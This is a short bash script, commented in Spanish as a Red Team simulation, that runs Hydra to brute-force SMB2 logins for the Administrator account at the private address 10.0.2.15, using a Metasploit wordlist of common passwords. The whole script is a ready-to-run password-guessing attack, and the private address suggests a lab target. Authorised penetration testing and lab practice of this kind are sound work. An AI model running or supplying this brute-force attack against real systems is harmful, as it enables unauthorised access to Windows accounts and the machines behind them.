#!/bin/bash
# ==============================================================================
# Script de simulacion de ataque Red Team: Fuerza Bruta SMB
# Herramienta: Hydra
# Protocolo: SMB2 (Windows 10 Compatibility)
# ==============================================================================

TARGET_IP="10.0.2.15"
USER="Administrator"
WORDLIST="/usr/share/wordlists/metasploit/common_roots.txt"

echo "[+] Iniciando simulacion de fuerza bruta SMB contra $TARGET_IP..."
hydra -l $USER -P $WORDLIST smb2://$TARGET_IP -t 1